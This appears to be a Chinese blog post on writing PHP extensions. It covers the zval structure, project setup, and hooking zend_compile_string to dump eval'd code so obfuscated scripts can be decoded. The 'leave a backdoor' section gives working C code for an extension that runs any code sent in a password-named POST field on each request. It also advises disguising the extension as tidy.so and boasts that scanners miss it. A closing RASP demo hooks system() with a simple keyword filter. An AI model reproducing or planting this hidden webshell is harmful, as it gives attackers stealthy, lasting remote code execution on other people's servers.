---
title: PHP 扩展学习
date: 2019-07-31 17:11:21
tags: [web, php]
---

PHP 类似于 python 也是运行在解释器上的, PHP 的叫 zend, python 的叫 cpython,  
这些都是官方实现, 像 python 也有 jython, pypy 啥的, 用其他语言写的解释器.  

<!-- more -->

两者有个非常相似的地方, 或者说动态语言都非常相似的地方, 是都存在一个万能基类,  
python 的叫 `PyObject`, php 的叫 `zval`. python 的因为没看过, 不太了解, 在 PHP 中,  
是靠 union 结构体来实现的  
```c
typedef union _zend_value {
	zend_long         lval;				/* long value */
	double            dval;				/* double value */
	zend_refcounted  *counted;
	zend_string      *str;
	zend_array       *arr;
	zend_object      *obj;
	zend_resource    *res;
	zend_reference   *ref;
	zend_ast_ref     *ast;
	zval             *zv;
	void             *ptr;
	zend_class_entry *ce;
	zend_function    *func;
	struct {
		uint32_t w1;
		uint32_t w2;
	} ww;
} zend_value;
```
因为是 union, 其实这大小在 amd64 上其实就是 8 字节, C 语言这神奇的特性其实在某种形式上做到了多态.  
一切对象都可以用 zval 来表达.

而 PHP 扩展, 就是可以直接干预这个 zend 虚拟机本身的执行, 比如加几个函数, 替换原来的函数之类的. zend 虚拟机会在启动时执行一系列函数,  
加载扩展里面定义的各种函数, PHP_MINIT, PHP_RINIT, PHP_FUNCTION 等等.  

## 环境准备

```sh
git clone https://github.com/php/php-src.git -b php-7.3.7
cd php-7.3.7
./ext/ext_skel.php --ext extname
./configure
```
就能自动生成一套模版, 毕竟是开源产品, 对开发者非常友好,  
CLion 可以用以下 CMakelist 添加高亮, 方便开发.  
```
cmake_minimum_required(VERSION 3.3)
project(backdoor)

add_custom_target(makefile COMMAND make WORKING_DIRECTORY ${PROJECT_SOURCE_DIR})


cmake_minimum_required(VERSION 3.6)
project(backdoor C)

message("Begin cmaking of PHP extension ...")

# -std=gnu99
set(CMAKE_C_STANDARD 99)
set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -ggdb -O0 -Wall -std=gnu99 -fvisibility=hidden")
set(ENV{PROJECT_ROOT} "${CMAKE_HOME_DIRECTORY}")

# NOTE: This CMake file is just for syntax highlighting in CLion, 替换成你自己的路径
include_directories(
        ~/temp/php-src/ 
        ~/temp/php-src/main
        ~/temp/php-src/Zend
        ~/temp/php-src/TSRM
        ~/temp/php-src/ext
        ~/temp/php-src/ext/standard
        ~/temp/php-src/sapi
)

set(SOURCE_FILES
        backdoor.c
        php_backdoor.h
        )

if(EXISTS "$ENV{PROJECT_ROOT}/config.h")
    set(SOURCE_FILES "${SOURCE_FILES};config.h")
endif()

add_library(backdoor ${SOURCE_FILES})

message("End cmaking of PHP extension ...")
```

接下来学习一下扩展的几种利用方式  

## 替换 zend_compile_string

这在 `php-src/Zend/zend_compile.h:722` 被定义, `php-src/Zend/zend.c:835` 被实现,  
```c
zend_compile_string = compile_string;
```
定义的时候就是定义为函数指针, 可以说是这么故意设计的, 就是为了方便替换.  
这个函数就是 zend engine 解析代码到 op code 的函数, 正如其名, 起到编译器的作用.  

而 eval, include 等等, 都会调用这个函数, 因为都需要编译到 op code 才能真正被执行.  
所以我们就能替换这个函数到自己定义的函数, 比如在 `compile_string` 的同时, 把  
它输入的字符串, 也就是代码打印出来, 就能在某些时候起到解密的作用.  
因为某些加密就是单纯各种变换最后 eval 一下而已, 本质原因是 PHP 本身就很灵活, 各种反射, 还有 $$var 这种东西,  
如果替换变量名/函数名, 大概率会导致代码不可用. 所以很多加密其实通过替换 zend_compile_string 就可以完全解密.  

了解了原理, 那么写起来不是很困难, 就是将 source_string 打印出来即可, 放在 `RINIT` 中, 每次请求都会重新替换一次.  
```c
zend_op_array *dump_while_eval(zval *source_string, char *filename)
{
    php_printf("\n\nfilename: \n");
    php_printf("%s", filename);
    php_printf("\n\neval_code: \n");
    php_printf("%s", Z_STRVAL_P(source_string));
    php_printf("\n\nresult: \n");
    return compile_string(source_string, filename);
}

/* {{{ PHP_RINIT_FUNCTION
 */
PHP_RINIT_FUNCTION(backdoor) {
#if defined(ZTS) && defined(COMPILE_DL_BACKDOOR)
    ZEND_TSRMLS_CACHE_UPDATE();
#endif
    // hook eval
    zend_compile_string = dump_while_eval;
    return SUCCESS;
}
```
这时候 `make && make install` 一下, 在 ini 中开启扩展, php -a 一下, 就可以发现已经成功了, 因为 php -a 说到底也得  
经过编译这个过程.


## 留后门

这个其实我感觉还是比较隐蔽的, 可以把原来的比如 `;extension=tidy`, `tidy.so`, 换成自己的, 然后开启,  
我估计很少有人会注意到, 查杀的话得检查 HASH 之类的, 说实话挺麻烦的, 毕竟每次更新这个 hash 都会变.  
而留后门的话一般都是在 RINIT 中添加, 每次都检查 `$_POST` 上有没有自己留下的后门密码, 有的话执行一下,  
相当于把 webshell 藏到扩展里面了.  
当然也可以自己给添加一个 my_eval 函数之类的, D 盾 100% 查不出来 233  

```c
PHP_FUNCTION(my_backdoor_eval) {
    char* tmp;
    size_t len;
    ZEND_PARSE_PARAMETERS_START(1, 1)
        Z_PARAM_STRING(tmp, len)
    ZEND_PARSE_PARAMETERS_END();
    zend_eval_string(tmp, NULL, (char *)"" TSRMLS_CC);
    RETURN_TRUE
}

/* {{{ PHP_RINIT_FUNCTION
 */
PHP_RINIT_FUNCTION(backdoor) {
#if defined(ZTS) && defined(COMPILE_DL_BACKDOOR)
    ZEND_TSRMLS_CACHE_UPDATE();
#endif
    char *password = "execute";

    zval * arr, *code = NULL;
    if (arr = zend_hash_str_find(&EG(symbol_table), "_POST", sizeof("_POST") - 1)) {
        if (Z_TYPE_P(arr) == IS_ARRAY &&
            (code = zend_hash_str_find(Z_ARRVAL_P(arr), password, strlen(password)))) {
            zend_eval_string(Z_STRVAL_P(code), NULL, "" TSRMLS_CC);
        }
    }
    return SUCCESS;
}

/* {{{ arginfo
 */
ZEND_BEGIN_ARG_INFO(arginfo_my_backdoor_eval, 0)
                ZEND_ARG_INFO(0, str)
ZEND_END_ARG_INFO()
/* }}} */

/* {{{ backdoor_functions[]
 */
static const zend_function_entry backdoor_functions[] = {
	PHP_FE(my_backdoor_eval,       arginfo_my_backdoor_eval)
	PHP_FE_END
};
/* }}} */
```

## RASP

这个其实我感觉前途应该是最大的, 可以参考 https://github.com/laruence/taint,  
毕竟是 PHP 的开发者, 真的 tql.  

我参考之前的 php_apd, 通过替换函数表里面的函数也实现了一个, 当然肯定没有鸟哥直接劫持 op code 的操作牛逼,  
劫持 op code 的执行可以拦截 eval, echo 之类的关键字, 而劫持函数表只能劫持函数, 相对更局限一些.  
而且我的实现感觉 100% 有内存泄露 (逃

```c
PHP_RINIT_FUNCTION(backdoor) {
#if defined(ZTS) && defined(COMPILE_DL_BACKDOOR)
    ZEND_TSRMLS_CACHE_UPDATE();
#endif
    char* internal_func_name = "system"; // 内置函数名
    char* new_internal_func_name = "__internal__"; // 新内置函数名

    zend_internal_function *internal_func = zend_hash_str_find_ptr(EG(function_table), internal_func_name, strlen(internal_func_name));
    zend_internal_function *copy_internal_func = malloc(sizeof(zend_internal_function));
    memcpy(copy_internal_func, internal_func, sizeof(zend_internal_function));
    
    zend_hash_str_add_ptr(EG(function_table), new_internal_func_name, strlen(new_internal_func_name), copy_internal_func);
    zend_hash_str_del(EG(function_table), internal_func_name, strlen(internal_func_name));

    char *replace_code = "function __temp__($a) {var_dump($a);if (preg_match('/bash/i', $a) === 0) {__internal__($a);} else {echo $a.' is banned';}};"; // 替换的函数代码

    zend_eval_string(replace_code, NULL , "");
    zend_op_array *replace_func = zend_hash_str_find_ptr(EG(function_table), "__temp__", strlen("__temp__"));

    zend_hash_str_add_ptr(EG(function_table), internal_func_name, strlen(internal_func_name), replace_func);
    *(replace_func->refcount) += 1;
    
    zend_hash_str_del(EG(function_table), "__temp__", strlen("__temp__"));
   
    return SUCCESS;
}
```
